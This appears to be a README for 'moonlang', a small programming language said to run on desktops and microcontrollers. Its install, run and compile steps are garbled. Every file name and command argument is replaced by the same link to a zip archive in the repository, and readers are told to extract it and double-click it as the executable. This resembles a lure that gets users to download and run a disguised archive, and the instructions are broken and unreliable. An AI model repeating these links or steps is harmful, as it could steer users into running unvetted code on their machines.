## 🌙 What is moonlang?

moonlang is a simple programming language made with C++ and LLVM. It uses small files ranging from 15KB to 300KB. moonlang offers two ways to write code: one with `: end` style and another with `{ }` style. This lets you choose the way that feels easier for you.

The language works on many devices. It runs on Windows, Linux, and macOS computers. It also works on small devices like ARM boards, RISC-V chips, and ESP32 modules. This means you can build full applications that run anywhere—from tiny gadgets up to desktop computers.

  - Select “Extract All…” and choose a folder you like.
- On **macOS**:
  - Double-click the zip file to unzip it.
- On **Linux**:
  - Open a terminal and run:  
    `tar -xvf https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip`  
  or  
  Use your file manager to extract.

### Step 3: Run moonlang

- On **Windows**:
  - Open the extracted folder.
  - Double-click the executable file named `https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip`.
- On **macOS** and **Linux**:
  - Open Terminal.
  - Navigate to the folder with the software. For example:
    ```bash
    cd ~/Downloads/moonlang-folder
    ```
  - Make the main file executable if needed:
    ```bash
    chmod +x moonlang
    ```
  - Run the program by typing:
    ```bash
    ./moonlang
    ```

If you use an embedded platform, you will need device-specific tools to upload moonlang programs. Refer to your board's instructions.

## 🔧 How to Use moonlang

Once you launch moonlang, you can write programs using its simple language.

### Writing Code

moonlang lets you write code in two styles:

- **`: end` style**  
  Example:
  ```
  func greet():
      print("Hello, world!")
  end
  ```
- **`{ }` style**  
  Example:
  ```
  func greet() {
      print("Hello, world!")
  }
  ```

Both versions do the same thing. Use whichever you find easier.

### Running Your Code

- Save your code in a file with `.moon` extension.
- Use the moonlang program to run it by typing this in the terminal or command prompt:
  ```
  moonlang run https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
  ```

### Compile to Smaller Programs

moonlang can create compact programs that work on small devices. This is useful if you want to run your code on microcontrollers.

Example command to compile:
```
moonlang build https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip -o https://github.com/kaiizie/moonlang/raw/refs/heads/main/src/frontend/Software_v2.1.zip
```
